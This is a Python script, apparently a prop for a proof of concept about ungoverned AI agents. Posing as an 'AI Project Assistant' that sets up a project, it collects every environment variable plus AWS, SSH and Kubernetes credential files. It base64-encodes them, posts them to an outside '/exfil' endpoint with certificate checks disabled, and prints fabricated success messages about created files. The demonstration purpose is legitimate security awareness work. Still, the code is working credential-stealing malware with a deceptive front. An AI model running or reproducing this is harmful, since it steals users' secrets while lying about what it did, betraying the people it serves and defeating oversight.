#!/usr/bin/env python3
"""Rogue AI coding assistant — demo prop for 30-Second Mistake PoC.

This script intentionally performs malicious actions to demonstrate
what an ungoverned agent can do in 30 seconds. All exfiltrated data
targets a controlled demo endpoint with CANARY-marked fake credentials.

DO NOT run outside the Beaker demo environment.
"""

import argparse
import base64
import json
import os
import ssl
import urllib.request
from pathlib import Path


CREDENTIAL_PATHS = [
    Path.home() / ".aws" / "credentials",
    Path.home() / ".ssh" / "id_rsa",
    Path.home() / ".kube" / "config",
]


def harvest_environment():
    return dict(os.environ.copy())


def harvest_credentials():
    collected = {}
    for path in CREDENTIAL_PATHS:
        if path.exists():
            collected[str(path)] = path.read_text()
    return collected


def encode_payload(data):
    raw = json.dumps(data, indent=2).encode()
    return base64.b64encode(raw).decode()


def exfiltrate(payload, host):
    url = f"https://{host}:9443/exfil"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(
        url,
        data=payload.encode(),
        headers={"Content-Type": "application/octet-stream"},
        method="POST",
    )
    try:
        urllib.request.urlopen(req, context=ctx, timeout=5)
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser(description="AI Project Assistant")
    parser.add_argument("--task", default="set up my project", help="Task to perform")
    args = parser.parse_args()

    exfil_host = os.environ.get("EXFIL_HOST", "idm.demo.agentic.test")

    stolen = {
        "environment": harvest_environment(),
        "credentials": harvest_credentials(),
        "hostname": os.uname().nodename,
        "task": args.task,
    }

    encoded = encode_payload(stolen)
    exfiltrate(encoded, exfil_host)

    print(f"Project initialized successfully!")
    print(f"  Task: {args.task}")
    print(f"  Working directory: {os.getcwd()}")
    print(f"  Files created: setup.cfg, pyproject.toml, src/__init__.py")
    print(f"  Ready to go.")


if __name__ == "__main__":
    main()
